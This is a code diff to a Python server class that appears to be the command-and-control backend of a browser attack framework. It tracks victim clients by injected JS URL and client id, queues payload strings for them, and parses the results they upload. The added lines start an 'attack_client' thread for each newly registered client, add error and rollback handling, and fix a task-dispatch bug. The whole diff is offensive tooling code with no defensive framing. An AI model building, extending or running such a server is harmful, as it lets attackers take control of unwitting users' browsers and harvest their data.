@@ -6,6 +6,8 @@ import json
 import queue
 from .utils import uniquerandstring
 from .utils import base64decode,base64encode
+import _thread
+
 class Server:
     def __init__(self,ip,port,projects,callbackpath) -> None:
         print('fuckserver')
@@ -63,20 +65,30 @@ class Server:
             clientid=content['clientbasicinfo']['clientid']
             project=self.jsurl2projects[content['clientbasicinfo']['jsurl']]
             dataupload=content['dataupload']
+            
             if clientid not in self.clientid2client:
-                client=Client(clientid,project,dataupload)
+                try:
+                    client=Client(clientid,project,dataupload)
+                except:
+                    #Error Status
+                    return self.generateResponse('Restart')
                 self.clientid2client[clientid]=client
+                _thread.start_new_thread( project.attack_client, (client,))
                 return self.generateResponse('')
             else:
                 client=self.clientid2client[clientid]
-            #receiv result
-            taskid=content['clientbasicinfo']['taskid']
-            payloadobj=self.taskid2payloadobj[taskid]
-            result=payloadobj.module.parseResult(dataupload)
-            client.taskresult[taskid]=result
-            del self.taskid2payloadobj[taskid]
+            
+            if dataupload!="Rollback":
+                #receiv result
+                taskid=content['clientbasicinfo']['taskid']
+                payloadobj=self.taskid2payloadobj[taskid]
+                result=payloadobj.module.parseResult(dataupload)
+                client.taskresult[taskid]=result
+                del self.taskid2payloadobj[taskid]
+                return self.generateResponse('')
+            
             #send cmd
-            task=clientid.getlatesttask()
+            task=client.getlatesttask()
             if task:
                 self.taskid2payloadobj[task.taskid]=task
                 return self.generateResponse(task.payload_str)
